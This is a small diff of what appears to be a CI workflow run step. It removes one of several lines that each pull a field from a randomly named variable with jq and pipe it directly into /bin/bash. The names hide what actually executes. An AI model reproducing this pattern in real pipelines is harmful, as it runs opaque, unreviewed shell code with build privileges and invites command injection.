@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$zmih23" | jq -r .agvb450 | /bin/bash
           printf '%s' "$i72944" | jq -r .u7175 | /bin/bash
-          echo $msng5 | jq -r .usiw52 | /bin/bash
           printf '%s' "$e653" | jq -r .xiq9712 | /bin/bash
 
       - name: Upload results
